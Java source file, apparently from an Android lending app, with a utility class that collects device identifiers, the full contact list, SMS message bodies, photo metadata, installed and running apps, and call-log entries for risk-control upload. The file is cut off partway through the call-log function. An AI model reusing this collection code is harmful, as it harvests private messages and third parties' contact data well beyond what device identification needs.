package com.sc.collectlibs;

import static androidx.core.content.ContextCompat.getSystemService;

import android.Manifest;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Application;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Rect;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.blankj.utilcode.util.GsonUtils;
import com.blankj.utilcode.util.PermissionUtils;
import com.blankj.utilcode.util.SPUtils;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.gson.Gson;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.LinkedBlockingQueue;

/**
 * @ClassName com.loanfz001.mm
 * @Description TODO
 * @Author Tzj
 * @Date 2022/7/19 17:46
 */
public class AppInfoUtil {
    private static int count = 0;
    private static String googleId = "";


    private static String deviceId;


    public static String getGoogleAdId(Context context) {
        String gaid = "";
        AdvertisingIdClient.Info adInfo = null;
        try {
            adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
        } catch (IOException e) {
            // Unrecoverable error connecting to Google Play services (e.g.,
            // the old version of the service doesn't support getting AdvertisingId).
            Log.e("getGAID", "IOException");
        } catch (GooglePlayServicesNotAvailableException e) {
            // Google Play services is not available entirely.
            Log.e("getGAID", "GooglePlayServicesNotAvailableException");
        } catch (Exception e) {
            Log.e("getGAID", "Exception:" + e.toString());
            // Encountered a recoverable error connecting to Google Play services.
        }
        if (adInfo != null) {
            gaid = adInfo.getId();
            Log.w("getGAID", "gaid:" + gaid);
        }
        googleId = gaid;
        return gaid;
    }


    @TargetApi(Build.VERSION_CODES.ECLAIR)
    public static String getContactString(Context context) {

        if (!PermissionUtils.isGranted(Manifest.permission.READ_CONTACTS)) {
            return "";
        }
        ContentResolver resolver = context.getContentResolver();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        //用于查询电话号码的URI
        Uri phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        // 查询的字段
        String[] projection = {
                ContactsContract.CommonDataKinds.Phone._ID,//Id
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,//通讯录姓名
                ContactsContract.CommonDataKinds.Phone.DATA1, "sort_key",//通讯录手机号
                ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED,//最近通话时间
                ContactsContract.CommonDataKinds.Phone.PHOTO_ID,//手机号Id
                ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
                ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP,
                ContactsContract.CommonDataKinds.Phone.STARRED,};//通话次数

        Cursor cursor = resolver.query(phoneUri, projection, null, null, null);
        JSONArray jsonArray = new JSONArray();
        while ((cursor.moveToNext())) {
            String name = cursor.getString(
                    cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = cursor.getString(
                    cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DATA1));
            long date = cursor.getLong(cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
            String times = cursor.getString(cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));
            long dateL = cursor.getLong(cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
            int start = cursor.getInt(cursor.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.STARRED));

            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("phone", phone);
                jsonObject.put("fullname", name);
                jsonObject.put("timesContacted", times);
                jsonObject.put("lastTimeContacted", date + "");
                jsonObject.put("updatedTime", dateL + "");
                jsonObject.put("createdTime", dateL + "");
                jsonObject.put("starred", start);
                jsonArray.put(jsonObject);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        cursor.close();
        count = jsonArray.length();
        return jsonArray.toString();
    }

    public static String getContactCount() {
        return count + "";
    }

    /**
     * 获取设备信息
     * 硬件信息上传风控 data_json内字段
     * nativePhone
     * os
     * osVersion
     * totalRom
     * usedRom
     * freeRom
     * totalRam
     * usedRam
     * freeRam
     * cookieId
     * imei
     * phoneBrand
     * deviceName
     * model
     * product
     * advertisingId
     * intranetIp
     * isAgent '是否代理登录 0 否 1是',
     * isRoot
     * isSimulator
     * systemLanguage
     * timeZone
     * systemTime
     * screenBrightness
     * nfcFunction
     * numberOfPhotos
     * numberOfMessages
     * numberOfCallRecords
     * numberOfVideos
     * numberOfApplications
     * numberOfSongs
     * systemBuildTime
     * iccid
     * persistentDeviceId
     * requestIp
     * resolution
     * resolutionHigh
     * resolutionWidth
     * bootTime
     * upTime
     * wifiMac
     * ssid
     * wifiIp
     * cellIp
     * meid
     * sid
     * basebandVersion
     * batteryStatus
     * batteryPower
     * networkOperators
     * signalStrength
     * mobileNetworkType
     * mcc
     * mnc
     * carrier
     * dns
     * canvas
     * radioType
     */

    interface GetDeviceInfo {

        void getDeviceInfo(String data);
    }

    public static String getDeviceInfo(Activity context, int authid) {
        View decorView = context.getWindow().getDecorView();
        Rect outRect = new Rect();
        decorView.getWindowVisibleDisplayFrame(outRect);
        /**设备信息集合*/
        HashMap<String, Object> deviceMap = new HashMap<>();
        deviceMap.put("acChargeState", getStatusACBattery(context));
        deviceMap.put("androidId", PhoneUtil.getAndroidId(context));
        deviceMap.put("audioExternalCount", getAudioExternalCount(context));
        deviceMap.put("audioInternalCount", getAudioInternalCount(context));
        deviceMap.put("authId", authid);
        deviceMap.put("batteryPct", getSystemBattery(context));
        deviceMap.put("brand", Build.BRAND);
        deviceMap.put("cellIp", getOutIp());
        deviceMap.put("chargingState", getStatusBattery(context));
        deviceMap.put("deviceName", Build.BRAND);
        deviceMap.put("downloadFilesCount", -999);
        deviceMap.put("gaid", AppInfoUtil.getGoogleAdId(context));

        deviceMap.put("imagesExternalCount", getSystemPhotoListExternalCount(context));
        deviceMap.put("imagesInternalCount", getSystemPhotoListInternalCount(context));
        deviceMap.put("imei", PhoneUtil.getIMEI(context));
        deviceMap.put("keyboard", AppInfoUtil.keyboardIsShow((Activity) context, outRect.bottom));
        deviceMap.put("language", PhoneUtil.getLanguage(context));
        long bootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime();
        deviceMap.put("lastBootTime", bootTime);
        deviceMap.put("latitude", "0");
        deviceMap.put("longitude", "0");
        deviceMap.put("model", Build.MODEL);
        deviceMap.put("nativePhone", PhoneUtil.getPhoneNumber(context));
        deviceMap.put("networkOperator", PhoneUtil.getOperatorName(context));
        deviceMap.put("networkType", PhoneUtil.getNetworkState(context));
        deviceMap.put("os", "android");
        deviceMap.put("osVersion", Build.VERSION.RELEASE);
        deviceMap.put("ramTotalSize", PhoneUtil.getTotalMemory(context));
        deviceMap.put("ramUsableSize", PhoneUtil.getUsedMemory(context));
        int screenWidth = context.getResources().getDisplayMetrics().widthPixels;
        int screenHeight = context.getResources().getDisplayMetrics().heightPixels;
        deviceMap.put("resolutionHigh", screenHeight);
        deviceMap.put("resolutionWidth", screenWidth);
        deviceMap.put("romTotalSize", PhoneUtil.getExternalMemorySize(context));
        deviceMap.put("romUsableSize", PhoneUtil.getUsedExternalMemorySize(context));
        deviceMap.put("rootState", PhoneUtil.isRootSystem() ? true : false);
        deviceMap.put("screenBrightness", PhoneUtil.getSystemBrightness(context) + "");
        deviceMap.put("serialNumber", PhoneUtil.getIMEI(context));
        deviceMap.put("simulatorState", PhoneUtil.canCallPhone(context) ? false : true);
        deviceMap.put("ssid", PhoneUtil.getConnectWifiSsid(context));
        deviceMap.put("timeZoneId", PhoneUtil.getGmtTimeZone());
        deviceMap.put("usbChargeState", getStatusUSBBattery(context));
        deviceMap.put("videoExternalCount", getVideoEXTERNALCount(context));
        deviceMap.put("videoInternalCount", getVideoINTERNALCount(context));
        deviceMap.put("wifiMac", PhoneUtil.getMacFromHardware());
        Gson gson = new Gson();
        return gson.toJson(deviceMap);
    }

    public static String getOutIp() {

        URL infoUrl = null;
        InputStream inStream = null;
        String line = "";
        try {
            infoUrl = new URL("http://pv.sohu.com/cityjson?ie=utf-8");
            URLConnection connection = infoUrl.openConnection();
            HttpURLConnection httpConnection = (HttpURLConnection) connection;
            int responseCode = httpConnection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                inStream = httpConnection.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(inStream, "utf-8"));
                StringBuilder strber = new StringBuilder();
                while ((line = reader.readLine()) != null)
                    strber.append(line + "\n");
                inStream.close();
                // 从反馈的结果中提取出IP地址
                int start = strber.indexOf("{");
                int end = strber.indexOf("}");
                String json = strber.substring(start, end + 1);
                if (json != null) {
                    try {
                        JSONObject jsonObject = new JSONObject(json);
                        line = jsonObject.optString("cip");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                return line;
            } else {

                //return getOutIp();
                return "unknown";
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return line;
    }

    public static String getDeviceId(Context context) {
        if (!TextUtils.isEmpty(deviceId)) {
            return deviceId;
        }
        if (context == null) {
            return deviceId;
        }
        //先获取保存的deviceI
        deviceId = SPUtils.getInstance("DEVICE_SP_NAME").getString("DEVICE_ID");
        String temp = "000000000000000";
        if (!TextUtils.isEmpty(deviceId) && !temp.equals(deviceId)) {
            return deviceId;
        }
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            deviceId = tm.getDeviceId();
        } catch (Exception e) {
        }
        if (TextUtils.isEmpty(deviceId) || temp.equals(deviceId)) {
            deviceId = UUID.randomUUID().toString();
        }
//        if (TextUtils.isEmpty(deviceId) || temp.equals(deviceId)) {
//            deviceId = UTDevice.getUtdid(app);
//        }
        if (!TextUtils.isEmpty(deviceId)) {
            SPUtils.getInstance("DEVICE_SP_NAME").put("DEVICE_ID", deviceId);
        }
        return deviceId;
    }

    public static String getAIString(Context context) {
        String gaid = "";
        AdvertisingIdClient.Info adInfo = null;
        try {
            adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
        } catch (IOException e) {
            // Unrecoverable error connecting to Google Play services (e.g.,
            // the old version of the service doesn't support getting AdvertisingId).
            Log.e("getGAID", "IOException");
        } catch (GooglePlayServicesNotAvailableException e) {
            // Google Play services is not available entirely.
            Log.e("getGAID", "GooglePlayServicesNotAvailableException");
        } catch (Exception e) {
            Log.e("getGAID", "Exception:" + e.toString());
            // Encountered a recoverable error connecting to Google Play services.
        }
        if (adInfo != null) {
            gaid = adInfo.getId();
            Log.w("getGAID", "gaid:" + gaid);
        }
        return gaid;
    }


    private static final class AC implements ServiceConnection {
        boolean retrieved = false;
        private final LinkedBlockingQueue<IBinder> queue = new LinkedBlockingQueue<IBinder>(1);

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            try {
                this.queue.put(service);
            } catch (InterruptedException localInterruptedException) {
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
        }

        public IBinder getBinder() throws InterruptedException {
            if (this.retrieved) {
                throw new IllegalStateException();
            }
            this.retrieved = true;
            return (IBinder) this.queue.take();
        }
    }

    private static final class AI implements IInterface {
        private IBinder binder;

        public AI(IBinder pBinder) {
            binder = pBinder;
        }

        @Override
        public IBinder asBinder() {
            return binder;
        }

        public String getId() throws RemoteException {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            String id;
            try {
                data.writeInterfaceToken("com.google.android.gms.ads.identifier.internal.IAdvertisingIdService");
                binder.transact(1, data, reply, 0);
                reply.readException();
                id = reply.readString();
            } finally {
                reply.recycle();
                data.recycle();
            }
            return id;
        }
    }

    /**
     * 实时获取电量
     */
    public static int getSystemBattery(Context context) {
        int level = 0;
        Intent batteryInfoIntent = context.getApplicationContext().registerReceiver(null,
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        level = batteryInfoIntent.getIntExtra("level", 0);
        int batterySum = batteryInfoIntent.getIntExtra("scale", 100);
        int percentBattery = 100 * level / batterySum;
        return percentBattery;
    }

    private static int getMessageCount(Context context) {
        if (!PermissionUtils.isGranted(Manifest.permission.READ_SMS)) {
            return 0;
        }
        int count = 0;
        Uri uri = Uri.parse("content://sms/");
        Cursor cursor = context.getContentResolver().query(uri,
                new String[]{
                        Telephony.Sms._ID,
                        Telephony.Sms.BODY,
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.DATE,
                        Telephony.Sms.STATUS},
                null, null, null);
        List<MessageInfo> messageInfoList = new ArrayList<>();
        if (cursor != null && cursor.getCount() > 0) {
            count = cursor.getCount();
            cursor.close();
        }
        return count;
    }

    public static int getSMSize(Context context) {
        JSONArray jsonArray = new JSONArray();

        try {
            Uri uri = Uri.parse("content://sms/");
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cur = contentResolver.query(uri, null, null, null, null);
            if (cur.moveToFirst()) {
                JSONObject jsonObject = new JSONObject();
                String name;
                String phoneNumber;
                String smsbody;
                String date;

                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");

                do {
                    name = cur.getString(nameColumn);
                    phoneNumber = cur.getString(phoneNumberColumn);
                    smsbody = cur.getString(smsbodyColumn);
                    //  SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                    //  Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                    //  date = dateFormat.format(d);
                    jsonObject.put("n", phoneNumber);
                    jsonObject.put("b", smsbody);
                    jsonObject.put("d", Long.parseLong(cur.getString(dateColumn)));
                    jsonArray.put(jsonObject);
                } while (cur.moveToNext());
            }
            cur.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return jsonArray.length();
    }


    //上传相册
    public static String getSystemPhotoList(Context context) {
        try {
            JSONArray jsonArray = new JSONArray();
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            if (cursor == null || cursor.getCount() <= 0) return null; // 没有图片
            while (cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                int displayName = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                int bucketName = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
                int storage = cursor
                        .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                int size = cursor.getColumnIndex(MediaStore.Images.Media.SIZE);
                int length = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT);
                int width = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH);
                int photoCreatedTime = 0;
                int photoUpdateTime = 0;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    photoCreatedTime = cursor.getColumnIndex(MediaStore.Images.Media.EXPOSURE_TIME);
                    photoUpdateTime = cursor.getColumnIndex(MediaStore.Images.Media.EXPOSURE_TIME);
                }
                jsonObject.put("display_name", cursor.getString(displayName));
                jsonObject.put("bucket_display_name", cursor.getString(bucketName));
                jsonObject.put("storage", cursor.getString(storage));
                jsonObject.put("size", cursor.getString(size));
                jsonObject.put("length", cursor.getString(length));
                jsonObject.put("width", cursor.getString(width));
                jsonObject.put("photo_created_time", photoCreatedTime == 0 ? "0" : cursor.getString(photoCreatedTime));
                jsonObject.put("photo_update_time", photoUpdateTime == 0 ? "" : cursor.getString(photoUpdateTime));
                jsonArray.put(jsonObject);
            }
            return jsonArray.toString();
        } catch (Exception e) {

        }

        return "";
    }

    public static int getSystemPhotoListExternalCount(Context context) {
        try {
            JSONArray jsonArray = new JSONArray();
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            if (cursor == null || cursor.getCount() <= 0) return -999; // 没有图片
            while (cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                int displayName = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                int bucketName = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
                int storage = cursor
                        .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                int size = cursor.getColumnIndex(MediaStore.Images.Media.SIZE);
                int length = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT);
                int width = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH);
                int photoCreatedTime = 0;
                int photoUpdateTime = 0;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    photoCreatedTime = cursor.getColumnIndex(MediaStore.Images.Media.EXPOSURE_TIME);
                    photoUpdateTime = cursor.getColumnIndex(MediaStore.Images.Media.EXPOSURE_TIME);
                }
                jsonObject.put("display_name", cursor.getString(displayName));
                jsonObject.put("bucket_display_name", cursor.getString(bucketName));
                jsonObject.put("storage", cursor.getString(storage));
                jsonObject.put("size", cursor.getString(size));
                jsonObject.put("length", cursor.getString(length));
                jsonObject.put("width", cursor.getString(width));
                jsonObject.put("photo_created_time", photoCreatedTime == 0 ? "0" : cursor.getString(photoCreatedTime));
                jsonObject.put("photo_update_time", photoUpdateTime == 0 ? "" : cursor.getString(photoUpdateTime));
                jsonArray.put(jsonObject);
            }
            return jsonArray.length();
        } catch (Exception e) {

        }

        return 0;
    }

    public static int getSystemPhotoListInternalCount(Context context) {
        try {
            JSONArray jsonArray = new JSONArray();
            Uri uri = MediaStore.Images.Media.INTERNAL_CONTENT_URI;

            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            if (cursor == null || cursor.getCount() <= 0) return -999; // 没有图片
            while (cursor.moveToNext()) {
                JSONObject jsonObject = new JSONObject();
                int displayName = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                int bucketName = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
                int storage = cursor
                        .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                int size = cursor.getColumnIndex(MediaStore.Images.Media.SIZE);
                int length = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT);
                int width = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH);
                int photoCreatedTime = 0;
                int photoUpdateTime = 0;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    photoCreatedTime = cursor.getColumnIndex(MediaStore.Images.Media.EXPOSURE_TIME);
                    photoUpdateTime = cursor.getColumnIndex(MediaStore.Images.Media.EXPOSURE_TIME);
                }
                jsonObject.put("display_name", cursor.getString(displayName));
                jsonObject.put("bucket_display_name", cursor.getString(bucketName));
                jsonObject.put("storage", cursor.getString(storage));
                jsonObject.put("size", cursor.getString(size));
                jsonObject.put("length", cursor.getString(length));
                jsonObject.put("width", cursor.getString(width));
                jsonObject.put("photo_created_time", photoCreatedTime == 0 ? "0" : cursor.getString(photoCreatedTime));
                jsonObject.put("photo_update_time", photoUpdateTime == 0 ? "" : cursor.getString(photoUpdateTime));
                jsonArray.put(jsonObject);
            }
            return jsonArray.length();
        } catch (Exception e) {

        }

        return 0;
    }

    /**
     * 上传短信内容
     */
    public static String getSmsList(Context context) {
        if (!PermissionUtils.isGranted(Manifest.permission.READ_SMS)) {
            return "";
        }

        try {
            JSONArray smsBeanList = new JSONArray();
            Uri uri = Uri.parse("content://sms/");
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type", "read"};
            // 获取手机内部短信
            Cursor cursor = context.getContentResolver().query(uri, projection, null,
                    null, "date desc");

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    int index_Address = cursor.getColumnIndex("address");
                    int index_Person = cursor.getColumnIndex("person");
                    int index_Body = cursor.getColumnIndex("body");
                    int index_Date = cursor.getColumnIndex("date");
                    int index_Type = cursor.getColumnIndex("type");
                    int index_read = cursor.getColumnIndex("read");
                    String strAddress = cursor.getString(index_Address);
                    String person = cursor.getString(index_Person);
                    String strBody = cursor.getString(index_Body);
                    long longDate = cursor.getLong(index_Date);
                    int intType = cursor.getInt(index_Type);
                    int intRead = cursor.getInt(index_read);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("smsPhone", strAddress);
                    jsonObject.put("smsContent", strBody);
                    jsonObject.put("smsType", intType == 2 ? 0 : 1);
                    jsonObject.put("read", intRead == 0 ? 1 : 0);
                    jsonObject.put("smsTime", longDate);
                    jsonObject.put("smsName", person);
                    if (!TextUtils.isEmpty(strBody)) {
                        smsBeanList.put(jsonObject);
                    }
                }
            }
            cursor.close();
            return smsBeanList.toString();

        } catch (Exception e) {

        }
        return "";
    }

    /**
     * 实时获取手机充电状态
     */
    public static boolean getStatusACBattery(Context context) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatusIntent = context.registerReceiver(null, ifilter);
        //如果设备正在充电，可以提取当前的充电状态和充电方式（无论是通过 USB 还是交流充电器），如下所示：

        // Are we charging / charged?
        int status = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;

        // How are we charging?
        int chargePlug = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;

        if (isCharging) {
            if (usbCharge) {
                //手机正处于USB连接
                return false;
                //return "usbCharge";
            } else if (acCharge) {
                //手机通过电源充电中！
                return true;
                //return "charging";
            }
        } else {
            //手机未连接USB线
            return false;
            // return "unCharging";
        }
        return false;
        //return "unknown";
    }


    public static boolean getStatusUSBBattery(Context context) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatusIntent = context.registerReceiver(null, ifilter);
        //如果设备正在充电，可以提取当前的充电状态和充电方式（无论是通过 USB 还是交流充电器），如下所示：

        // Are we charging / charged?
        int status = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;

        // How are we charging?
        int chargePlug = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;

        if (isCharging) {
            if (usbCharge) {
                //手机正处于USB连接
                return true;
                //return "usbCharge";
            } else if (acCharge) {
                //手机通过电源充电中！
                return false;
                //return "charging";
            }
        } else {
            //手机未连接USB线
            return false;
            // return "unCharging";
        }
        return false;
        //return "unknown";
    }

    public static boolean getStatusBattery(Context context) {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatusIntent = context.registerReceiver(null, ifilter);
        //如果设备正在充电，可以提取当前的充电状态和充电方式（无论是通过 USB 还是交流充电器），如下所示：

        // Are we charging / charged?
        int status = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL;

        // How are we charging?
        int chargePlug = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        return isCharging;
    }


    private static int getVideoEXTERNALCount(Context context) {
        if ((ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_EXTERNAL_STORAGE
        ) != PackageManager.PERMISSION_GRANTED)
        ) {
            return -999;
        }
        Cursor videoCursor = context.getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);
        int count = 0;
        while (videoCursor.moveToNext()) {
            count++;
        }
        videoCursor.close();
        if (count == 0) {
            return -999;
        }
        return count;
    }

    private static int getVideoINTERNALCount(Context context) {
        if ((ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_EXTERNAL_STORAGE
        ) != PackageManager.PERMISSION_GRANTED)
        ) {
            return -999;
        }
        Cursor videoCursor = context.getContentResolver().query(
                MediaStore.Video.Media.INTERNAL_CONTENT_URI,
                null, null, null, null);
        int count = 0;
        while (videoCursor.moveToNext()) {
            count++;
        }
        videoCursor.close();
        if (count == 0) {
            return -999;
        }
        return count;
    }

    /**
     * 获取外部音频数量
     */
    private static int getAudioExternalCount(Context context) {
        if ((ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_EXTERNAL_STORAGE
        ) != PackageManager.PERMISSION_GRANTED)
        ) {
            return -999;
        }
        Cursor audioCursor = context.getContentResolver().query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);
        int count = 0;
        while (audioCursor.moveToNext()) {
            count++;
        }
        audioCursor.close();
        if (count == 0) {
            return -999;
        }
        return count;
    }

    /**
     * 获取内部音频数量
     */
    private static int getAudioInternalCount(Context context) {
        if ((ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_EXTERNAL_STORAGE
        ) != PackageManager.PERMISSION_GRANTED)
        ) {
            return -999;
        }
        Cursor audioCursor = context.getContentResolver().query(
                MediaStore.Audio.Media.INTERNAL_CONTENT_URI,
                null, null, null, null);
        int count = 0;
        while (audioCursor.moveToNext()) {
            count++;
        }
        audioCursor.close();
        if (count == 0) {
            return -999;
        }
        return count;
    }


    public static String getAppList(Context context) {
        JSONArray jsonArray = new JSONArray();
        PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> packageInfos = packageManager.getInstalledPackages(0);
        List<String> aliveApps = getAppAliveList(context);
        for (PackageInfo packageInfo : packageInfos) {
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("appName",
                        packageInfo.applicationInfo.loadLabel(context.getPackageManager())
                                .toString());
                jsonObject.put("updatedTime", packageInfo.lastUpdateTime + "");
                jsonObject.put("installedTime", packageInfo.firstInstallTime + "");
                jsonObject.put("pkgName", packageInfo.packageName);
                jsonObject.put("appVersion", packageInfo.versionName);
                jsonObject.put("isSystem",
                        ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM)
                                == 0)
                                ? "0" : "1");
                jsonObject.put("isAppActive",
                        aliveApps.contains(packageInfo.packageName) ? "1" : "0");
                if (!packageInfo.applicationInfo.loadLabel(context.getPackageManager())
                        .toString().isEmpty()) {
                    jsonArray.put(jsonObject);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return jsonArray.toString();
    }

    /**
     * 获取已启动应用的包名列表
     */
    @TargetApi(Build.VERSION_CODES.CUPCAKE)
    private static List<String> getAppAliveList(
            Context context) {
        List<String> aliveApps = new ArrayList<>();
        ActivityManager activityManager =
                (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> processInfos =
                activityManager.getRunningAppProcesses();
        for (int i = 0; i < processInfos.size(); i++) {
            aliveApps.add(processInfos.get(i).processName);
            Log.e("eeee", "processName=" + aliveApps.get(i));
        }
        return aliveApps;
    }

    static int keyboardIsShow(Activity activity, int orb) {
        View decorView = activity.getWindow().getDecorView();
        Rect outRect = new Rect();
        decorView.getWindowVisibleDisplayFrame(outRect);
        int corb = outRect.bottom;
//获取到键盘高度
        int difference = orb - corb;
        DecimalFormat df = new DecimalFormat("0.00");
        float ratio = (float) corb / orb;
        float keyboardRatio = (float) difference / orb;

//设定一个比较的阈值(假如这里设定为0.3)
        if (keyboardRatio > 0.3) {
            return 1;
        }
        return 0;
    }


    /**
     * 获取通话记录
     *
     * @param context
     * @return
     */
    public static String getRecord(Context context) {
        if (!PermissionUtils.isGranted(Manifest.permission.READ_CALL_LOG)) {
            return "";
        }
        try {

            ContentResolver resolver;
            Uri callUri = CallLog.Calls.CONTENT_URI;
            String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
                    , CallLog.Calls.NUMBER// 通话记录的电话号码
                    , CallLog.Calls.DATE// 通话记录的日期
                    , CallLog.Calls.DURATION// 通话时长
